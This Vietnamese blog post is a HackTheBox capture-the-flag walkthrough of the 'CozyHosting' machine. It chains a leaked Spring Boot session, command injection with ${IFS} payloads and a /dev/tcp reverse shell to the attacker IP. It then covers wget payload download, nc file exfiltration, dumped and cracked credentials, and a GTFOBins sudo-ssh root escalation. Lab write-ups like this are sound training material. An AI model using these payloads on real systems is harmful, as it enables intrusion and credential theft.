---
layout: post
author: Neo
title: Hackthebox - CozyHosting
date: 2023-10-07
tags:
  - web
  - linux
  - spring boot
  - ssh
  - gtfobins
  - burpsuite
  - command injection
  - hackthebox
categories: ctf
---
0. this unordered seed list will be replaced by toc as unordered list
{:toc}

![intro](/assets/img/2023-10-07-HTB-CozyHosting/1.png)

## Reconnaissance and Scanning

```python
PORT      STATE SERVICE   REASON         VERSION
22/tcp    open  ssh       syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4356bca7f2ec46ddc10f83304c2caaa8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEpNwlByWMKMm7ZgDWRW+WZ9uHc/0Ehct692T5VBBGaWhA71L+yFgM/SqhtUoy0bO8otHbpy3bPBFtmjqQPsbC8=
|   256 6f7a6c3fa68de27595d47b71ac4f7e42 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHVzF8iMVIHgp9xMX9qxvbaoXVg1xkGLo61jXuUAYq5q
80/tcp    open  http      syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
8000/tcp  open  http-alt? syn-ack ttl 63
8083/tcp  open  us-srv?   syn-ack ttl 63
12345/tcp open  netbus?   syn-ack ttl 63
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Thêm host vào /etc/hosts để truy cập web server

```python
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.230    cozyhosting.htb
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
```

Dùng nuclei để scan qua web này

```python 
┌──(root㉿kali)-[/home/kali]
└─# nuclei -u http://cozyhosting.htb

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v2.9.10

                projectdiscovery.io

[WRN] Found 1 templates with syntax error (use -validate flag for further examination)
[INF] Current nuclei version: v2.9.10 (outdated)
[INF] Current nuclei-templates version: v9.6.4 (latest)
[INF] New templates added in latest release: 121
[INF] Templates loaded for current scan: 6893
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1202 (Reduced 1141 Requests)
[nginx-version] [http] [info] http://cozyhosting.htb [nginx/1.18.0]
[INF] Using Interactsh Server: oast.site
[tech-detect:bootstrap] [http] [info] http://cozyhosting.htb
[tech-detect:google-font-api] [http] [info] http://cozyhosting.htb
[tech-detect:nginx] [http] [info] http://cozyhosting.htb
[dns-saas-service-detection] [dns] [info] cozyhosting.htb
[springboot-actuator:available-endpoints] [http] [info] http://cozyhosting.htb/actuator [self,sessions,beans,env,env-toMatch,health,health-path,mappings]                       [options-method] [http] [info] http://cozyhosting.htb [GET,HEAD,OPTIONS]
[springboot-env] [http] [low] http://cozyhosting.htb/actuator/env
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://cozyhosting.htb
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://cozyhosting.htb
[http-missing-security-headers:strict-transport-security] [http] [info] http://cozyhosting.htb
[http-missing-security-headers:permissions-policy] [http] [info] http://cozyhosting.htb
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://cozyhosting.htb
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://cozyhosting.htb
[http-missing-security-headers:content-security-policy] [http] [info] http://cozyhosting.htb
[http-missing-security-headers:referrer-policy] [http] [info] http://cozyhosting.htb
[http-missing-security-headers:clear-site-data] [http] [info] http://cozyhosting.htb
[springboot-mappings] [http] [low] http://cozyhosting.htb/actuator/mappings
[openssh-detect] [tcp] [info] cozyhosting.htb:22 [SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.3]
[spring-detect] [http] [info] http://cozyhosting.htb/error
[waf-detect:nginxgeneric] [http] [info] http://cozyhosting.htb/
[springboot-beans] [http] [low] http://cozyhosting.htb/actuator/beans
```

Để ý có dir là *actuator*, đây là Spring Boot. 

Sử dụng dirsearch 

```python 
┌──(root㉿kali)-[/home/kali/jexboss]
└─# dirsearch -u http://cozyhosting.htb -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt              

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                             
 (_||| _) (/_(_|| (_| )                                                                                                      
                                                                                                                             
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 112
Output File: /root/.dirsearch/reports/cozyhosting.htb/_23-10-07_06-37-28.txt
Error Log: /root/.dirsearch/logs/errors-23-10-07_06-37-28.log
Target: http://cozyhosting.htb/
[06:37:29] Starting: 
[06:37:29] 200 -  634B  - /actuator                                         
[06:37:29] 200 -    5KB - /actuator/env                                     
[06:37:29] 200 -  487B  - /actuator/env/path
[06:37:29] 200 -  487B  - /actuator/env/home                                
[06:37:30] 200 -  487B  - /actuator/env/lang                                
[06:37:30] 200 -   15B  - /actuator/health                                  
[06:37:30] 200 -   10KB - /actuator/mappings                                
[06:37:30] 200 -   98B  - /actuator/sessions                                
[06:37:30] 200 -  124KB - /actuator/beans                                               Task Completed            
```

Tôi có */actuator/sessions*

```python
┌──(root㉿kali)-[/home/kali/jexboss]
└─# curl http://cozyhosting.htb/actuator/sessions
{"6D3BD4BCE55E6178BBDFA87EEB570468":"kanderson"}     
```

## Enumeration

Sử dụng burpsuite để chèn sessionID

![burp](/assets/img/2023-10-07-HTB-Cozyhosting/2.png)

![web](/assets/img/2023-10-07-HTB-Cozyhosting/3.png)

Thử nhập input vào 2 trường và bắt request bằng burp

![command](/assets/img/2023-10-07-HTB-Cozyhosting/4.png)

Ở trường *location* trong response trả về cho tôi kết quả của kết nối. Vậy thì tôi có thể thử command injection để server trả kết quả về cho tôi được không

![space](/assets/img/2023-10-07-HTB-Cozyhosting/5.png)

Thử [bypass without space](https://swisskyrepo.github.io/PayloadsAllTheThings/Command%20Injection/#bypass-without-space)

![ping](/assets/img/2023-10-07-HTB-Cozyhosting/6.png)

Thử thêm [dấu nháy ngược](https://swisskyrepo.github.io/PayloadsAllTheThings/Command%20Injection/#inside-a-command)

![ping2](/assets/img/2023-10-07-HTB-Cozyhosting/7.png)

Vậy là thành công. Tôi sẽ sử dụng cách này để tải RCE lên máy.

## RCE

Đầu tiên, tất nhiên rồi, tạo RCE trước. Tạo 1 file với tên `rce.sh` với IP và port (dùng để tạo listener)

`bash -c "/bin/bash -i >& /dev/tcp/10.10.14.65/5555 0>&1"`

`cd` đến thư mục chứa rce phía trên và tạo local http server

```python
┌──(root㉿kali)-[/home/kali]
└─# python3 -m http.server 2345
Serving HTTP on 0.0.0.0 port 2345 (http://0.0.0.0:2345/) ...
```

Tiếp theo tải RCE lên máy (IP VPN của tôi đã thay đổi) theo lệnh

```python
host=10.10.14.65&username=`wget${IFS}http://10.10.14.65:2345/rce.sh${IFS}-P${IFS}/tmp`
```

![upload](/assets/img/2023-10-07-HTB-Cozyhosting/8.png)

Quay lại http server để kiểm tra

```python
┌──(root㉿kali)-[/home/kali]
└─# python3 -m http.server 2345
Serving HTTP on 0.0.0.0 port 2345 (http://0.0.0.0:2345/) ...
10.10.11.230 - - [09/Oct/2023 04:37:38] "GET /rce.sh HTTP/1.1" 200 -
```

Thay đổi permission của file RCE (burp request)

```python
host=10.10.14.65&username=`chmod${IFS}777${IFS}/tmp/rce.sh`
```

Tạo listener trên máy attack

```python
┌──(root㉿kali)-[/home/kali]
└─# nc -lnvp 5555
listening on [any] 5555 ...
```

Chạy RCE 

```python
host=10.10.14.65&username=`bash${IFS}/tmp/rce.sh`
```

Quay lại listener

```python
┌──(root㉿kali)-[/home/kali]
└─# nc -lnvp 5555
listening on [any] 5555 ...
connect to [10.10.14.65] from (UNKNOWN) [10.10.11.230] 43542
bash: cannot set terminal process group (1043): Inappropriate ioctl for device
bash: no job control in this shell
app@cozyhosting:/app$ id
id
uid=1001(app) gid=1001(app) groups=1001(app)
app@cozyhosting:/app$ 
```

*Lưu ý: trong toàn bộ quá trình tạo RCE, nếu bị mất kết nối thì reload trang sessions để lấy sessiong mới của kanderson*

## SSH

```python
app@cozyhosting:/tmp$ ls /home
ls /home
josh
```

Tôi có 1 user tên *josh*

```python
app@cozyhosting:/app$ ls -la
ls -la
total 58856
drwxr-xr-x  2 root root     4096 Aug 14 14:11 .
drwxr-xr-x 19 root root     4096 Aug 14 14:11 ..
-rw-r--r--  1 root root 60259688 Aug 11 00:45 cloudhosting-0.0.1.jar
```

Lấy file jar này về và thử phân tích

```python
app@cozyhosting:/app$ nc 10.10.14.65 1234 < cloudhosting-0.0.1.jar
nc 10.10.14.65 1234 < cloudhosting-0.0.1.jar
app@cozyhosting:/app$ 
```

```python
┌──(root㉿kali)-[/home/kali]
└─# nc -lnvp 1234 > cloudhosting-0.0.1.jar
listening on [any] 1234 ...
connect to [10.10.14.65] from (UNKNOWN) [10.10.11.230] 33940
```

Sử dụng [jadx | Kali Linux Tools](https://www.kali.org/tools/jadx/) để mở file jar này. Tôi tìm thấy thông tin đăng nhập vào database postgresql

![postgresql](/assets/img/2023-10-07-HTB-Cozyhosting/9.png)

Quay lại RCE để đăng nhập db

```python
app@cozyhosting:/tmp$ psql -h localhost -p 5432 -U postgres -d cozyhosting
psql -h localhost -p 5432 -U postgres -d cozyhosting
Password for user postgres: Vg&nvzAQ7XxR
```

Một lúc lục lọi thì tôi đã tìm được credentials

```python
kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User 
admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```

Dùng *john* để decrypt hash này

```python
┌──(root㉿kali)-[~]
└─# john -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt --format=bcrypt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (admin)     
1g 0:00:00:08 DONE (2023-10-09 10:50) 0.1119g/s 322.5p/s 322.5c/s 322.5C/s mygirl..secrets
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Thử login ssh với user *josh* và password vừa decrypt được

```python
┌──(root㉿kali)-[~]
└─# ssh josh@10.10.11.230
josh@10.10.11.230's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-82-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Oct  9 03:01:09 PM UTC 2023

  System load:           0.0
  Usage of /:            55.4% of 5.42GB
  Memory usage:          36%
  Swap usage:            0%
  Processes:             301
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.230
  IPv6 address for eth0: dead:beef::250:56ff:feb9:9679


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Oct  9 14:32:04 2023 from 10.10.14.106
josh@cozyhosting:~$ id
uid=1003(josh) gid=1003(josh) groups=1003(josh)
josh@cozyhosting:~$ 
josh@cozyhosting:~$ ls 
user.txt
```

## Privilege escalation

```python
josh@cozyhosting:~$ sudo -l
[sudo] password for josh: 
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

Vào [ssh | GTFOBins](https://gtfobins.github.io/gtfobins/ssh/) và lấy quyền root với sudo 

```python
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# id
uid=0(root) gid=0(root) groups=0(root)
# ls /root
root.txt
```


